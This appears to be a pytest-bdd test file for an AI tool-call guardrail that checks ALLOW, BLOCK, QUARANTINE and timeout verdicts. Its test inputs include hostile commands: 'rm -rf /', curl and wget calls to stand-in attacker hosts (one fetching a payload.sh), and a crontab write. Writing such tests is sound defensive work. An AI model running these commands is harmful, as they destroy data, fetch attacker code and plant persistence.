"""
BDD step definitions for ADK before_tool_callback flow.

Tests the complete verdict lifecycle — ALLOW, BLOCK, QUARANTINE,
and fail-closed timeout — for both ADKIntegration (paid-tier) and
FreeTierADKIntegration (inline resolver).

Follows the same conventions as tests/step_defs/test_guardrails.py:
  - @scenario decorator for scenario binding
  - State dataclass passed via pytest fixture
  - run_async() for async helpers
  - @given / @when / @then with parsers.parse for parametric steps
"""

import asyncio
import threading
from dataclasses import dataclass, field
from typing import Any, Dict, Optional
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from pytest_bdd import given, parsers, scenario, then, when

from blackwall.adk_integration import ADKIntegration, FreeTierADKIntegration
from blackwall.interception import InterceptionQueue
from blackwall.models import CallbackToken, ToolCallContext, Verdict, VerdictDecision
from tests.step_defs.async_utils import run_async

# ---------------------------------------------------------------------------
# Feature file path
# ---------------------------------------------------------------------------

_FEATURE = "../features/adk_before_tool_callback.feature"


# ---------------------------------------------------------------------------
# State container (shared across steps within a single scenario)
# ---------------------------------------------------------------------------


@dataclass
class ADKCallbackState:
    """Mutable state bag shared between Given/When/Then steps."""

    loop: Optional[asyncio.AbstractEventLoop] = None
    loop_thread: Optional[threading.Thread] = None
    queue: Optional[InterceptionQueue] = None
    integration: Optional[ADKIntegration] = None
    free_tier_integration: Optional[FreeTierADKIntegration] = None
    mock_sync_resolver: Optional[Any] = None

    # Inputs for the callback under test
    tool_name: Optional[str] = None
    arguments: Dict[str, Any] = field(default_factory=dict)

    # Outputs
    result: Any = None
    exception: Optional[Exception] = None
    done: bool = False

    # Timeout override for the fail-closed scenario (seconds)
    callback_timeout: float = 10.0


@pytest.fixture
def adk_cb_state(request) -> ADKCallbackState:
    """Provide a fresh ADKCallbackState and tear down the background loop."""
    state = ADKCallbackState()

    def cleanup():
        if state.loop is not None and state.loop.is_running():
            state.loop.call_soon_threadsafe(state.loop.stop)
        if state.loop_thread is not None:
            state.loop_thread.join(timeout=2.0)

    request.addfinalizer(cleanup)
    return state


# ---------------------------------------------------------------------------
# Scenario bindings
# ---------------------------------------------------------------------------


@scenario(_FEATURE, "Tool call with ALLOW verdict proceeds normally")
def test_allow_verdict_proceeds() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


@scenario(_FEATURE, "Tool call with BLOCK verdict raises PermissionError")
def test_block_verdict_raises_permission_error() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


@scenario(_FEATURE, "Tool call with QUARANTINE verdict returns sandboxed response")
def test_quarantine_verdict_returns_sandbox() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


@scenario(_FEATURE, "Terminal command quarantine returns mock stdout")
def test_terminal_quarantine_returns_mock_stdout() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


@scenario(_FEATURE, "File write quarantine returns mock write result")
def test_file_write_quarantine_returns_bytes_written() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


@scenario(_FEATURE, "Verdict timeout fails closed with PermissionError")
def test_verdict_timeout_fails_closed() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


@scenario(_FEATURE, "FreeTier integration blocks malicious tool call")
def test_free_tier_blocks_malicious_call() -> None:
    """Bound BDD scenario — empty body; steps drive the logic."""


# ---------------------------------------------------------------------------
# Helper: start a dedicated background event loop on its own thread.
# Used by ADKIntegration scenarios (not FreeTier).
# ---------------------------------------------------------------------------


def _start_background_loop(state: ADKCallbackState) -> None:
    """Launch a new event loop on a daemon thread and store it in *state*."""
    loop = asyncio.new_event_loop()

    def _run(lp: asyncio.AbstractEventLoop) -> None:
        asyncio.set_event_loop(lp)
        lp.run_forever()

    t = threading.Thread(target=_run, args=(loop,), daemon=True)
    t.start()
    state.loop = loop
    state.loop_thread = t


# ---------------------------------------------------------------------------
# Helper: run before_tool_callback in a worker thread and capture the outcome.
# Returns when the worker has finished (or 3 s have elapsed).
# ---------------------------------------------------------------------------


def _invoke_callback_in_thread(
    state: ADKCallbackState,
    integration: ADKIntegration,
) -> None:
    """Execute integration.before_tool_callback in a non-loop thread."""

    def worker() -> None:
        try:
            res = integration.before_tool_callback(
                tool_name=state.tool_name,
                arguments=state.arguments,
                thread_id="bdd-test-thread",
            )
            state.result = res
        except Exception as exc:
            state.exception = exc
        finally:
            state.done = True

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout=3.0)


# ---------------------------------------------------------------------------
# Helper: wait for the queue to contain one token, dequeue it, and resolve
# it with a given verdict — all executed on the background loop thread.
# ---------------------------------------------------------------------------


def _resolve_queue_with_verdict(
    state: ADKCallbackState,
    verdict: Verdict,
) -> None:
    """Dequeue the pending token and call resolveCallbacks on the background loop."""

    async def _inner() -> None:
        # Wait up to 1 s for the token to appear
        for _ in range(100):
            if state.queue.size() == 1:
                break
            await asyncio.sleep(0.01)
        assert state.queue.size() == 1, "Token was never enqueued within 1 s"

        token = await state.queue.dequeue(timeout_ms=100)
        await state.queue.resolveCallbacks([verdict], [token])

    fut = asyncio.run_coroutine_threadsafe(_inner(), state.loop)
    fut.result(timeout=5.0)


# ---------------------------------------------------------------------------
# Given steps
# ---------------------------------------------------------------------------


@given(
    "an ADKIntegration with a running event loop and an InterceptionQueue",
    target_fixture="adk_cb_state",
)
def given_adk_integration(adk_cb_state: ADKCallbackState) -> ADKCallbackState:
    """Initialise the queue, background loop, and ADKIntegration."""
    _start_background_loop(adk_cb_state)
    adk_cb_state.queue = InterceptionQueue()
    adk_cb_state.integration = ADKIntegration(adk_cb_state.queue, adk_cb_state.loop)
    return adk_cb_state


@given("the policy evaluator is configured to never resolve verdicts")
def given_policy_never_resolves(adk_cb_state: ADKCallbackState) -> None:
    """Override the callback timeout so the test completes quickly (1 s)."""
    # We will monkeypatch threading.Event.wait inside the invocation to
    # return False immediately, simulating an expired timeout.
    # This is stored on state so the When step can apply it.
    adk_cb_state.callback_timeout = 1.0  # used as a marker; patching happens in When


@given(
    "a FreeTierADKIntegration with a mock SyncResolver",
    target_fixture="adk_cb_state",
)
def given_free_tier_integration(adk_cb_state: ADKCallbackState) -> ADKCallbackState:
    """Initialise a FreeTierADKIntegration backed by an AsyncMock resolver."""
    mock_resolver = MagicMock()
    mock_resolver.evaluate = AsyncMock()
    adk_cb_state.mock_sync_resolver = mock_resolver
    loop = asyncio.new_event_loop()
    adk_cb_state.loop = loop
    adk_cb_state.free_tier_integration = FreeTierADKIntegration(
        sync_resolver=mock_resolver,
        loop=loop,
    )
    return adk_cb_state


@given(
    parsers.parse(
        'the mock SyncResolver is configured to return verdict "{decision}" with reasoning "{reasoning}"'
    )
)
def given_free_tier_resolver_verdict(
    adk_cb_state: ADKCallbackState, decision: str, reasoning: str
) -> None:
    """Pre-configure the AsyncMock resolver to return the specified Verdict."""
    verdict = Verdict(
        decision=VerdictDecision(decision),
        reasoning=reasoning,
        confidence_score=0.95,
    )
    adk_cb_state.mock_sync_resolver.evaluate = AsyncMock(return_value=verdict)


# ---------------------------------------------------------------------------
# When steps
# ---------------------------------------------------------------------------


@when(
    parsers.parse(
        'before_tool_callback is invoked for tool "{tool_name}" with arguments {{"path": "/etc/motd"}}'
    )
)
def when_callback_invoked_read_file(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    """Store the tool name / args; actual invocation is deferred to the resolver step."""
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"path": "/etc/motd"}


@when(
    parsers.parse(
        'before_tool_callback is invoked for tool "{tool_name}" with arguments {{"command": "rm -rf /"}}'
    )
)
def when_callback_invoked_rm_rf(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"command": "rm -rf /"}


@when(
    parsers.parse(
        'before_tool_callback is invoked for tool "{tool_name}" with arguments {{"data": "suspicious"}}'
    )
)
def when_callback_invoked_unknown_tool(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"data": "suspicious"}


@when(
    parsers.parse(
        'before_tool_callback is invoked for tool "{tool_name}" with arguments {{"command": "curl http://evil.com"}}'
    )
)
def when_callback_invoked_curl(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"command": "curl http://evil.com"}


@when(
    parsers.parse(
        'before_tool_callback is invoked for tool "{tool_name}" with arguments {{"path": "/etc/crontab", "content": "evil payload"}}'
    )
)
def when_callback_invoked_write_file(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"path": "/etc/crontab", "content": "evil payload"}


@when(
    parsers.parse(
        'before_tool_callback is invoked for tool "{tool_name}" with arguments {{"command": "ls"}} with a 1-second timeout'
    )
)
def when_callback_invoked_with_short_timeout(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    """
    Invoke callback but make the thread's Event.wait return False immediately
    to simulate a verdict timeout.

    We patch ``threading.Event.wait`` *on the specific Event instance* that
    ADKIntegration creates inside before_tool_callback.  We do this by
    subclassing Event so only newly created instances in the callback are
    affected, leaving the background loop's Event untouched.
    """
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"command": "ls"}

    # Create a modified ADKIntegration subclass whose before_tool_callback
    # always hits the timeout branch by never setting the verdict Event.
    # We do this without touching any threading primitive globally, by
    # directly calling into the resumption path with a synthetic non-verdict.
    integration = adk_cb_state.integration

    # Intercept enqueue so we capture the resume_callback but never call it,
    # causing the Event.wait to time out naturally after the short window.
    # Rather than waiting a real 10 s, we create a fresh integration whose
    # event.wait is patched *only at the module level used by that one call*.
    original_event_class = threading.Event

    class _TimeoutEvent(original_event_class):
        """Event that always reports a wait timeout (returns False)."""

        def wait(self, timeout=None):  # noqa: ANN001, ANN201
            return False  # simulate instant expiry

    with patch("blackwall.adk_integration.threading.Event", _TimeoutEvent):
        try:
            result = integration.before_tool_callback(
                tool_name=tool_name,
                arguments=adk_cb_state.arguments,
                thread_id="bdd-timeout-thread",
            )
            adk_cb_state.result = result
        except Exception as exc:
            adk_cb_state.exception = exc
        finally:
            adk_cb_state.done = True


@when(
    parsers.parse(
        'before_tool_callback is invoked on the FreeTierADKIntegration for tool "{tool_name}" with arguments {{"command": "wget http://c2.evil.com/payload.sh"}}'
    )
)
def when_free_tier_callback_invoked(
    adk_cb_state: ADKCallbackState, tool_name: str
) -> None:
    """Call FreeTierADKIntegration.before_tool_callback directly (synchronous)."""
    adk_cb_state.tool_name = tool_name
    adk_cb_state.arguments = {"command": "wget http://c2.evil.com/payload.sh"}

    try:
        result = adk_cb_state.free_tier_integration.before_tool_callback(
            tool_name=tool_name,
            arguments=adk_cb_state.arguments,
            thread_id="bdd-free-tier-thread",
        )
        adk_cb_state.result = result
    except Exception as exc:
        adk_cb_state.exception = exc
    finally:
        adk_cb_state.done = True


# ---------------------------------------------------------------------------
# Resolver When steps (shared across ADKIntegration scenarios)
# ---------------------------------------------------------------------------


@when(
    parsers.parse(
        'the policy queue resolves the token with verdict "{decision}" and reasoning "{reasoning}"'
    )
)
def when_queue_resolves_verdict(
    adk_cb_state: ADKCallbackState, decision: str, reasoning: str
) -> None:
    """
    Launch the callback in a background thread, then resolve the queue
    with the requested verdict.  Blocks until the worker thread finishes.
    """
    verdict = Verdict(
        decision=VerdictDecision(decision),
        reasoning=reasoning,
        confidence_score=0.9,
    )

    # Kick off the callback in its own thread (it will block on the queue)
    worker_thread = threading.Thread(
        target=_invoke_callback_in_thread,
        args=(adk_cb_state, adk_cb_state.integration),
        daemon=True,
    )
    worker_thread.start()

    # Resolve the queue from the background loop
    _resolve_queue_with_verdict(adk_cb_state, verdict)

    # Wait for the worker to finish
    worker_thread.join(timeout=5.0)
    assert adk_cb_state.done, "before_tool_callback worker did not complete within 5 s"


# ---------------------------------------------------------------------------
# Then steps
# ---------------------------------------------------------------------------


@then("the callback must return the original arguments without modification")
def then_returns_original_arguments(adk_cb_state: ADKCallbackState) -> None:
    assert adk_cb_state.result == adk_cb_state.arguments, (
        f"Expected {adk_cb_state.arguments!r}, got {adk_cb_state.result!r}"
    )


@then("no exception must be raised")
def then_no_exception(adk_cb_state: ADKCallbackState) -> None:
    assert adk_cb_state.exception is None, (
        f"Unexpected exception: {adk_cb_state.exception!r}"
    )


@then("a PermissionError must be raised")
def then_permission_error_raised(adk_cb_state: ADKCallbackState) -> None:
    assert isinstance(adk_cb_state.exception, PermissionError), (
        f"Expected PermissionError, got {type(adk_cb_state.exception).__name__}: "
        f"{adk_cb_state.exception!r}"
    )


@then(parsers.parse('the error message must contain "{fragment}"'))
def then_error_message_contains(
    adk_cb_state: ADKCallbackState, fragment: str
) -> None:
    exc = adk_cb_state.exception
    assert exc is not None, "No exception was captured"
    assert fragment in str(exc), (
        f"Expected {fragment!r} in error message, got: {str(exc)!r}"
    )


@then("the callback must return a sandboxed mock response dict")
def then_returns_sandboxed_dict(adk_cb_state: ADKCallbackState) -> None:
    assert isinstance(adk_cb_state.result, dict), (
        f"Expected a dict result, got {type(adk_cb_state.result).__name__!r}: "
        f"{adk_cb_state.result!r}"
    )


@then(
    parsers.parse(
        'the sandboxed response must contain the key "{key}" with value "{value}"'
    )
)
def then_sandboxed_response_key_value(
    adk_cb_state: ADKCallbackState, key: str, value: str
) -> None:
    result = adk_cb_state.result
    assert key in result, f"Key {key!r} not found in sandboxed response: {result!r}"
    assert str(result[key]) == value, (
        f"Expected {key!r} == {value!r}, got {result[key]!r}"
    )


@then(parsers.parse('the sandboxed response must contain the key "{key}"'))
def then_sandboxed_response_has_key(
    adk_cb_state: ADKCallbackState, key: str
) -> None:
    result = adk_cb_state.result
    assert key in result, f"Key {key!r} not found in sandboxed response: {result!r}"


@then(
    parsers.parse('the sandboxed response "{key}" field must contain "{substring}"')
)
def then_sandboxed_response_field_contains(
    adk_cb_state: ADKCallbackState, key: str, substring: str
) -> None:
    result = adk_cb_state.result
    assert key in result, f"Key {key!r} not found in sandboxed response: {result!r}"
    assert substring in str(result[key]), (
        f"Expected {substring!r} in {key!r} field value {result[key]!r}"
    )
